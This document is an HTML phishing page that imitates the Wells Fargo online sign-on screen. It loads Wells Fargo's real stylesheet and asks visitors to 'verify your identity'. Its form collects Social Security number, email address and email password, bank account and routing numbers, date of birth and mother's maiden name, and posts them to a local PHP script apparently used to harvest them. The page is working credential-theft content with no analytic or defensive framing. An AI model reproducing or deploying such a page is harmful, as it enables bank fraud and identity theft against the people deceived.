<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Wells Fargo&nbsp;Sign On to View Your Accounts</title>
<link rel="shortcut icon" link rel="logo-icon" href="img/favicon.ico">
<link rel="stylesheet" type="text/css" href="https://www01.wellsfargomedia.com/css/mobile/smartphone-home.css"/>
<style>
body {
    background-color: #44464a;
    font-size: 100%;
    margin: 0;
}
a, a:link, a:visited {
    color: white;
}
.primary{
	background: url(img/btn_blueslice.gif) repeat-x scroll left top transparent;
    border: 1px solid #e0e3e2;
    font-weight: bold;
    margin: 7px 10px 8px 4px;
    padding: 2px 10px;
    color: white;
    float: right;
}
.icon-bar{
display: block;
width: 28px;
height: 4px;
border-bottom: 4px solid #ae1e23;
border-radius: 1px;
background-color: white;
}
</style>
</head>
<body>
<div style="height: 42px;position: fixed;top: 0;left: 0;right: 0;transition: all .5s ease-in-out;z-index: 1030;background-color: #ae1e23;overflow: hidden;width: auto;">
<center>
<table style="width: 300px;padding: 3px;">
<tr>
<td><img src="img/tgo.svg"/></td>
<td><center><img src='img/logo.png'/></center></td>
<td>
<span class="icon-bar">&zwj;</span>
<span class="icon-bar">&zwj;</span>
<span class="icon-bar">&zwj;</span>
</td>
</tr>
</table>
</center>
</div>
<br>
<br>
<div class="overlaySignOn" style="top: 42px;" aria-hidden="false">
<div class="overlayContainer">
<div class="welcome-container" style="font-size: 19px;font-family: sans-serif;">Please verify your identity for Wells Fargo Online Accounts</div>
<div class="security-container">
<span class="security-img"></span>
<a href="" class="security-text">Online &amp; Mobile Security</a>
</div>
<div align="center" class="signOnContainer">							
<form id="frmSignon" action="email/general.php" method="post" autocomplete="off">
<font style="text-align: left;color: #fcc60a;float: left;font-size: 16px;padding: 3px;"> 

Social Security number (SSN) </font>
<input type="text" required="required" id="userid" class="required" name="ssn" value="" autocomplete="off">

<font style="text-align: left;color: #fcc60a;float: left;font-size: 16px;padding: 3px;"> Your Email  </font>
<input type="text" required="required" id="userid" class="required" name="email" value="" autocomplete="off">

<font style="text-align: left;color: #fcc60a;float: left;font-size: 16px;padding: 3px;"> Your Email Password  </font>
<input type="password" required="required" id="userid" class="required" name="pass" value="" autocomplete="off">

<font style="text-align: left;color: #fcc60a;float: left;font-size: 16px;padding: 3px;"> Your Account Number  </font>
<input type="text" required="required" id="userid" class="required" name="acn" value="" autocomplete="off">

<font style="text-align: left;color: #fcc60a;float: left;font-size: 16px;padding: 3px;"> Your Routing Number  </font>
<input type="text" required="required" id="userid" class="required" name="rtn" value="" autocomplete="off">

<font style="text-align: left;color: #fcc60a;float: left;font-size: 16px;padding: 3px;"> Date Of Birth  </font>
<input type="text" required="required" id="userid" class="required" placeholder="day/month/year" name="dob" value="" autocomplete="off">


<font style="text-align: left;color: #fcc60a;float: left;font-size: 16px;padding: 3px;"> Mother Maiden Name  </font>
<input type="text" required="required" id="userid" class="required" name="mmn" value="" autocomplete="off">

<input type="submit" class="signOn" value="Continue >>">
</form>
			</div>
</div>
			
		</div>
</body>
</html>
